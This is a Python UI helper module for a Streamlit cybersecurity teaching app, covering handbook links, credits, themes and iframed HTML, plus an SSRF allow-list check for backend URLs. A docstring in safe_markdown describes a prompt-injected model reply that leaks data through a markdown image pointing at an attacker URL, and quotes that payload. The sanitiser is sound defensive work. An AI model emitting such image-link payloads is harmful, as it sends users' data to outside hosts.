"""
frontend/ui_kit.py — small shared helpers for the Deploy, Security Lab and Roadmap pages.

Keeps three things consistent across pages: handbook links (stages are named,
never "Module N"), the credit line for the handbook, and self-contained HTML
blocks (no external scripts — they must work inside the container, offline).
"""

from __future__ import annotations

import os
import re
from pathlib import Path

import streamlit as st
import streamlit.components.v1 as components

HANDBOOK_URL = "https://raushan1107.github.io/AI-Machine-Learning-Handbook/"
HANDBOOK_REPO = "https://github.com/raushan1107/AI-Machine-Learning-Handbook"
BACKEND_URL = os.environ.get("CAMEL_BACKEND_URL", "http://localhost:8000")
PROJECT_ROOT = Path(__file__).resolve().parents[1]

# Learning-path stages, in order. The number shows sequence only; the name is the label.
STAGES: list[dict[str, str]] = [
    {"n": "1", "name": "Data Science & Financial Data Analysis", "page": "module1.html"},
    {"n": "2", "name": "Deep Neural Networks", "page": "module2.html"},
    {"n": "3", "name": "NLP & Financial Text AI", "page": "module3.html"},
    {"n": "4", "name": "Generative AI, LLMs & RLHF", "page": "module4.html"},
    {"n": "5", "name": "RAG, LangChain & AI Agents", "page": "module5.html"},
    {"n": "6", "name": "Explainable & Responsible AI", "page": "module6.html"},
    {"n": "7", "name": "Federated & Privacy-Preserving ML", "page": "module7.html"},
    {"n": "8", "name": "Multimodal AI", "page": "module8.html"},
    {"n": "9", "name": "Graph Neural Networks", "page": "module9.html"},
    {"n": "10", "name": "MLOps & Deployment", "page": "module10.html"},
    {"n": "11", "name": "AI Cybersecurity", "page": ""},
    {"n": "12", "name": "Capstone: One Secured System", "page": ""},
]


# Validated categorical order (dataviz reference palette, first three slots pass all-pairs CVD
# checks) and fixed status colours. Status colours always ship with an icon + label.
SERIES = ["#2a78d6", "#eb6834", "#1baf7a"]
STATUS = {"good": "#0ca30c", "warning": "#fab219", "serious": "#ec835a", "critical": "#d03b3b"}


def stage_url(n: str | int) -> str:
    page = STAGES[int(n) - 1]["page"]
    return HANDBOOK_URL + page if page else HANDBOOK_URL


def stage_label(n: str | int) -> str:
    s = STAGES[int(n) - 1]
    return f"{s['n']} · {s['name']}"


DEVELOPER = "Raushan Ranjan"
DEVELOPER_URL = "https://raushan-ranjan.azurewebsites.net"
CREDIT_LINES = (f"Developer: {DEVELOPER}", f"Books/Handbook/Notes written by {DEVELOPER}")
DEV_MD = f"[{DEVELOPER}]({DEVELOPER_URL})"                                        # for st.markdown
DEV_HTML = f"<a href='{DEVELOPER_URL}' target='_blank' rel='noopener'>{DEVELOPER}</a>"  # for st.html


def handbook_credit(compact: bool = False) -> None:
    """The standing credit line: the handbook teaches the fundamentals behind this app."""
    if compact:
        st.caption(f"📘 Fundamentals: [AI/ML + Cybersecurity Handbook]({HANDBOOK_URL}) · "
                   f"Developer: {DEV_MD} · Books/Handbook/Notes written by {DEV_MD}")
        return
    st.info(
        f"📘 **Learn the fundamentals first.** Every concept on this page is taught step by step in the "
        f"[**AI/ML + Cybersecurity Handbook**]({HANDBOOK_URL}) ([GitHub]({HANDBOOK_REPO})), written by "
        f"**{DEV_MD}**, the developer of this project. The handbook explains the ideas; this app shows "
        f"them working together in one real system."
    )


def learn_link(n: str | int, topic: str = "") -> None:
    extra = f" → {topic}" if topic else ""
    st.markdown(f"📘 Learn the fundamentals: [{stage_label(n)}{extra}]({stage_url(n)})")


# ── Backend API address (one setting for the whole app) ───────────────────────
# The UI can point at any CAMEL Sentinel API — local, docker compose, or one running in
# Azure Container Apps — switchable in the sidebar or with a link like ?backend=https://…
#
# Security (docs/09 F1): a free-text URL would let visitors make this server call any host
# (SSRF: internal services, cloud metadata). So a new address must (1) be http(s),
# (2) match the host allow-list, and (3) answer GET /health like a CAMEL API before it is
# used. Operators can pin the address with CAMEL_LOCK_BACKEND=1.
DEFAULT_BACKEND_URL = BACKEND_URL
DEFAULT_ALLOWED_HOSTS = ["localhost", "127.0.0.1", "api", "*.azurecontainerapps.io", "*.azurewebsites.net", "*.azure-api.net"]


def _allowed_hosts() -> list[str]:
    extra = [h.strip().lower() for h in os.environ.get("CAMEL_BACKEND_ALLOWLIST", "").split(",") if h.strip()]
    return DEFAULT_ALLOWED_HOSTS + extra


def validate_backend(url: str) -> tuple[bool, str]:
    """Allow-list + handshake. Returns (ok, message); never echoes the remote response."""
    from fnmatch import fnmatch
    from urllib.parse import urlparse

    import requests

    url = (url or "").strip().rstrip("/")
    parts = urlparse(url)
    if parts.scheme not in ("http", "https") or not parts.hostname:
        return False, "Use a full http:// or https:// address."
    if parts.username or parts.password:
        return False, "Credentials in the URL are not allowed."
    host = parts.hostname.lower()
    if not any(fnmatch(host, pat) for pat in _allowed_hosts()):
        return False, (f"Host '{host}' is not on the allow-list ({', '.join(_allowed_hosts())}). "
                       "An operator can add it with CAMEL_BACKEND_ALLOWLIST.")
    try:
        r = requests.get(url + "/health", timeout=60, allow_redirects=False)  # 60 s: scale-to-zero cold starts
        data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
    except (requests.RequestException, ValueError):
        return False, "No CAMEL Sentinel API answered at that address (tried GET /health)."
    if r.status_code != 200 or data.get("status") != "ok":
        return False, "That address answered, but not like a CAMEL Sentinel API (/health)."
    return True, "Connected ✅ (model loaded)" if data.get("model_loaded") else "Connected — model still loading…"


def backend_url() -> str:
    """The API address every page should use (session choice, else server default)."""
    return st.session_state.get("backend_url", DEFAULT_BACKEND_URL)


def backend_panel() -> None:
    """Sidebar control (rendered once by the router, so it applies to every page)."""
    locked = os.environ.get("CAMEL_LOCK_BACKEND") == "1"
    wanted = st.query_params.get("backend")
    if wanted and not locked and st.session_state.get("_backend_param") != wanted:
        st.session_state["_backend_param"] = wanted
        ok, msg = validate_backend(wanted)
        if ok:
            st.session_state["backend_url"] = wanted.strip().rstrip("/")
        st.session_state["_backend_msg"] = ("✅ " if ok else "⛔ ") + msg
    with st.sidebar.expander(f"🔌 Backend API · {'custom' if 'backend_url' in st.session_state else 'default'}",
                             expanded=bool(st.session_state.get("_backend_msg", "").startswith("⛔"))):
        st.caption(f"Using `{backend_url()}`")
        if locked:
            st.caption("Pinned by the operator (CAMEL_LOCK_BACKEND=1).")
            return
        new = st.text_input("Point this UI at another API", placeholder="https://<app>.azurecontainerapps.io",
                            key="_backend_input")
        c1, c2 = st.columns(2)
        if c1.button("Connect", key="_backend_connect", width="stretch") and new:
            with st.spinner("Checking /health (a scaled-to-zero app can take ~1 min)…"):
                ok, msg = validate_backend(new)
            if ok:
                st.session_state["backend_url"] = new.strip().rstrip("/")
            st.session_state["_backend_msg"] = ("✅ " if ok else "⛔ ") + msg
            st.rerun()
        if c2.button("Reset", key="_backend_reset", width="stretch"):
            st.session_state.pop("backend_url", None)
            st.session_state["_backend_msg"] = f"↩️ Back to default: {DEFAULT_BACKEND_URL}"
            st.rerun()
        if st.session_state.get("_backend_msg"):
            st.caption(st.session_state["_backend_msg"])
        st.caption("Tip: share `?backend=<url>` to open the app already connected.")


def backend_url_setting(label: str = "Backend URL") -> str:
    """Kept for existing pages: shows the active API (changed from the sidebar 🔌 panel)."""
    st.caption(f"{label}: `{backend_url()}` · change it in the sidebar 🔌 Backend API")
    return backend_url()


_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
_MD_LINK = re.compile(r"\[([^\]]+)\]\((?:https?:)?//[^)]*\)")
_HTML_TAG = re.compile(r"<[^>]+>")


def safe_markdown(text: str) -> str:
    """Neutralise model output before rendering (docs/09 F3).

    A prompt-injected reply could contain ![x](https://attacker/?data=…); rendering it
    makes the viewer's browser fetch that URL and leak data. Images become a label,
    remote links become plain text, and raw HTML tags are dropped.
    """
    text = _MD_IMAGE.sub(lambda m: f"[image removed: {m.group(1) or 'untitled'}]", text or "")
    text = _MD_LINK.sub(lambda m: m.group(1), text)
    return _HTML_TAG.sub("", text)


GLOBAL_CSS = """
<style>
.block-container{padding-top:2.2rem;padding-bottom:5rem}
h1{letter-spacing:-.02em}
[data-testid="stSidebarNav"] [data-testid="stNavSectionHeader"]{font-weight:700;letter-spacing:.04em;text-transform:uppercase;font-size:.72rem;opacity:.75}
.stTabs [data-baseweb="tab-list"]{gap:4px;overflow-x:auto;scrollbar-width:thin}
.stTabs [data-baseweb="tab"]{border-radius:10px 10px 0 0;padding:6px 12px}
[data-testid="stMetric"]{border:1px solid rgba(128,128,128,.25);border-radius:12px;padding:10px 14px}
[data-testid="stExpander"] details{border-radius:12px}
.camel-credit{border:1px solid rgba(128,128,128,.3);border-radius:12px;padding:10px 12px;font-size:.8rem;line-height:1.45}
.camel-credit b{font-size:.84rem}
.camel-footer{margin-top:3rem;padding:14px 0 4px;border-top:1px solid rgba(128,128,128,.25);font-size:.8rem;opacity:.85;text-align:center;line-height:1.6}
@media (max-width:640px){.block-container{padding-left:1rem;padding-right:1rem}}
</style>
"""


# ── Themes ────────────────────────────────────────────────────────────────────
# Per-visitor themes chosen in the sidebar (kept in session state, shareable via ?theme=).
# "System" leaves Streamlit's own light/dark handling untouched; the others override the
# page, the iframed HTML blocks (via the same tokens) and Altair charts (via chart()).
THEMES: dict[str, dict[str, str] | None] = {
    "🖥️ System": None,
    "☀️ Light": {"scheme": "light", "bg": "#ffffff", "bg2": "#f3f5f8", "panel": "#f6f7f9", "text": "#0b0b0b", "muted": "#52514e",
                 "border": "#d7dce4", "accent": "#2a78d6", "on_accent": "#ffffff", "input": "#ffffff", "code": "#f3f4f6", "link": "#1c5cab"},
    "🌙 Dark": {"scheme": "dark", "bg": "#0e1117", "bg2": "#161a22", "panel": "#1a1d24", "text": "#f5f6f8", "muted": "#b8bcc6",
                "border": "#2e3440", "accent": "#3987e5", "on_accent": "#ffffff", "input": "#1b1f27", "code": "#141821", "link": "#86b6ef"},
    "◐ High contrast": {"scheme": "dark", "bg": "#000000", "bg2": "#000000", "panel": "#0a0a0a", "text": "#ffffff", "muted": "#ffffff",
                        "border": "#ffffff", "accent": "#ffd400", "on_accent": "#000000", "input": "#000000", "code": "#000000", "link": "#ffd400"},
    "📜 Sepia (reading)": {"scheme": "light", "bg": "#f5ecd9", "bg2": "#efe3cc", "panel": "#f9f2e3", "text": "#3b2f1e", "muted": "#6b5a43",
                          "border": "#d9c7a6", "accent": "#9a5b13", "on_accent": "#ffffff", "input": "#fbf6ea", "code": "#efe3cc", "link": "#8a4f0c"},
    "🌊 Ocean": {"scheme": "dark", "bg": "#0b1d2e", "bg2": "#0f2740", "panel": "#12304d", "text": "#e6f1fb", "muted": "#a9c3dc",
                "border": "#24496d", "accent": "#2bb3c0", "on_accent": "#04121d", "input": "#0f2740", "code": "#0a1826", "link": "#7fd8e0"},
}
_THEME_SLUGS = {name: re.sub(r"[^a-z]+", "-", name.lower()).strip("-") for name in THEMES}


def theme_selector() -> None:
    """Sidebar picker; also honours ?theme=<slug> so a themed link can be shared."""
    names = list(THEMES)
    if "camel_theme" not in st.session_state:
        wanted = st.query_params.get("theme", "")
        st.session_state.camel_theme = next((n for n, s in _THEME_SLUGS.items() if s == wanted), names[0])
    with st.sidebar:
        st.selectbox("🎨 Theme", names, key="camel_theme",
                     help="System follows your device. High contrast is designed for accessibility.")


def current_theme() -> dict[str, str] | None:
    return THEMES.get(st.session_state.get("camel_theme", "🖥️ System"))


def _theme_css(t: dict[str, str]) -> str:
    hc = t["border"] == "#ffffff"  # high contrast extras
    return f"""
<style>
:root{{color-scheme:{t['scheme']}}}
[data-testid="stApp"],[data-testid="stAppViewContainer"],[data-testid="stHeader"],[data-testid="stBottomBlockContainer"]{{background:{t['bg']};color:{t['text']}}}
[data-testid="stSidebar"],[data-testid="stSidebar"]>div{{background:{t['bg2']}}}
[data-testid="stApp"] h1,[data-testid="stApp"] h2,[data-testid="stApp"] h3,[data-testid="stApp"] h4,[data-testid="stApp"] h5,
[data-testid="stApp"] p,[data-testid="stApp"] li,[data-testid="stApp"] label,[data-testid="stMarkdownContainer"],
[data-testid="stSidebarNav"] span,[data-testid="stMetricValue"],[data-testid="stMetricLabel"],[data-testid="stWidgetLabel"],
[data-baseweb="tab"],[data-testid="stExpander"] summary,[data-testid="stNavSectionHeader"]{{color:{t['text']}}}
[data-testid="stCaptionContainer"],[data-testid="stCaptionContainer"] p{{color:{t['muted']}}}
[data-testid="stApp"] a{{color:{t['link']}}}
[data-baseweb="input"],[data-baseweb="input"]>div,[data-baseweb="select"]>div,[data-baseweb="textarea"],[data-baseweb="base-input"],
[data-testid="stApp"] input,[data-testid="stApp"] textarea,[data-testid="stNumberInputContainer"]{{background:{t['input']};color:{t['text']};border-color:{t['border']}}}
[data-baseweb="popover"] ul,[data-baseweb="popover"] li,[data-baseweb="menu"]{{background:{t['input']};color:{t['text']}}}
[data-testid="stBaseButton-primary"]{{background:{t['accent']};border-color:{t['accent']};color:{t['on_accent']}}}
[data-testid="stBaseButton-primary"] p{{color:{t['on_accent']}}}
[data-testid="stBaseButton-secondary"]{{background:{t['panel']};border-color:{t['border']};color:{t['text']}}}
[data-baseweb="tab"][aria-selected="true"],[data-baseweb="tab"][aria-selected="true"] p{{color:{t['accent']}}}
[data-baseweb="tab-highlight"]{{background:{t['accent']}}}
[data-baseweb="tab-border"]{{background:{t['border']}}}
[data-testid="stCode"] pre,[data-testid="stCode"] code,[data-testid="stApp"] code{{background:{t['code']};color:{t['text']}}}
[data-testid="stMetric"],[data-testid="stExpander"] details,[data-testid="stChatMessage"]{{background:{t['panel']};border-color:{t['border']}}}
[data-testid="stVerticalBlockBorderWrapper"]{{border-color:{t['border']}}}
[data-testid="stAlertContainer"]{{background:color-mix(in srgb,{t['accent']} 14%,{t['bg']});color:{t['text']}}}
[data-testid="stAlertContainer"]:has([data-testid="stAlertContentSuccess"]){{background:color-mix(in srgb,#0ca30c 18%,{t['bg']})}}
[data-testid="stAlertContainer"]:has([data-testid="stAlertContentWarning"]){{background:color-mix(in srgb,#fab219 18%,{t['bg']})}}
[data-testid="stAlertContainer"]:has([data-testid="stAlertContentError"]){{background:color-mix(in srgb,#d03b3b 20%,{t['bg']})}}
[data-testid="stAlertContainer"] *{{color:{t['text']}}}
.camel-credit,.camel-footer{{border-color:{t['border']};color:{t['text']}}}
{"[data-testid='stApp'] a{text-decoration:underline} *:focus-visible{outline:3px solid #ffd400 !important;outline-offset:2px}"
 " [data-testid='stMetric'],[data-testid='stVerticalBlockBorderWrapper'],[data-testid='stExpander'] details{border-width:2px}" if hc else ""}
</style>"""


def apply_global_style() -> None:
    st.html(GLOBAL_CSS)
    t = current_theme()
    if t:
        st.html(_theme_css(t))


def chart(ch, **kwargs) -> None:
    """st.altair_chart that follows the selected theme (Streamlit's chart theme follows only light/dark)."""
    t = current_theme()
    if t is None:
        st.altair_chart(ch, **kwargs)
        return
    themed = (ch.configure(background=t["bg"])
                .configure_axis(labelColor=t["text"], titleColor=t["text"], gridColor=t["border"], domainColor=t["muted"], tickColor=t["muted"])
                .configure_legend(labelColor=t["text"], titleColor=t["text"])
                .configure_title(color=t["text"])
                .configure_header(labelColor=t["text"], titleColor=t["text"])
                .configure_view(stroke=t["border"]))
    st.altair_chart(themed, theme=None, **kwargs)


def sidebar_credits() -> None:
    with st.sidebar:
        st.html(
            f"<div class='camel-credit'>👨‍💻 <b>Developer: {DEV_HTML}</b><br>📘 Books/Handbook/Notes written by {DEV_HTML}<br>"
            f"<a href='{HANDBOOK_URL}' target='_blank' rel='noopener'>AI/ML + Cybersecurity Handbook ↗</a> · "
            f"<a href='{DEVELOPER_URL}' target='_blank' rel='noopener'>Developer site ↗</a></div>"
        )


def footer() -> None:
    st.html(
        f"<div class='camel-footer'>🐫 <b>CAMEL Sentinel</b> · Developer: {DEV_HTML} · Books/Handbook/Notes written by {DEV_HTML}<br>"
        f"<a href='{HANDBOOK_URL}' target='_blank' rel='noopener'>AI/ML + Cybersecurity Handbook</a> · "
        f"<a href='{HANDBOOK_REPO}' target='_blank' rel='noopener'>GitHub</a> · "
        f"<a href='{DEVELOPER_URL}' target='_blank' rel='noopener'>raushan-ranjan.azurewebsites.net</a> · "
        f"Teaching project — scores are not official supervisory ratings.</div>"
    )


def in_container() -> bool:
    return Path("/.dockerenv").exists() or os.environ.get("MODE") in {"all", "ui", "api"}


BASE_CSS = """
<style>
:root{color-scheme:light;--bg:#ffffff;--panel:#f6f7f9;--ink:#0b0b0b;--muted:#52514e;--line:#dde1e8;
--accent:#2a78d6;--orange:#eb6834;--teal:#1baf7a;--violet:#4a3aa7;
--ok:#0ca30c;--warn:#fab219;--serious:#ec835a;--bad:#d03b3b}
@media (prefers-color-scheme: dark){:root{color-scheme:dark;--bg:#0e1117;--panel:#1a1a19;--ink:#ffffff;--muted:#c3c2b7;
--line:#34342f;--accent:#3987e5;--orange:#d95926;--teal:#199e70;--violet:#9085e9}}
*{box-sizing:border-box}
html,body{margin:0;background:transparent;color:var(--ink);font:14px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
.muted{color:var(--muted)}
.pill{display:inline-block;padding:2px 9px;border-radius:999px;font-size:12px;font-weight:600;border:1px solid var(--line)}
code,.mono{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:12.5px}
</style>
"""


def html(body: str, height: int, scrolling: bool = False) -> None:
    """Render a self-contained, iframed HTML block with the shared light/dark tokens.

    st.iframe (Streamlit ≥ 1.5x) replaces the deprecated components.v1.html; the
    iframe keeps each block's CSS/JS isolated from the page and from each other.
    """
    t = current_theme()
    override = "" if t is None else (
        f"<style>:root{{color-scheme:{t['scheme']};--bg:{t['bg']};--panel:{t['panel']};--ink:{t['text']};"
        f"--muted:{t['muted']};--line:{t['border']};--accent:{t['accent']}}}</style>")
    doc = "<!doctype html><html><head><meta charset='utf-8'>" + BASE_CSS + override + "</head><body>" + body + "</body></html>"
    if hasattr(st, "iframe"):
        st.iframe(doc, height=height)
    else:  # older Streamlit
        components.html(doc, height=height, scrolling=scrolling)
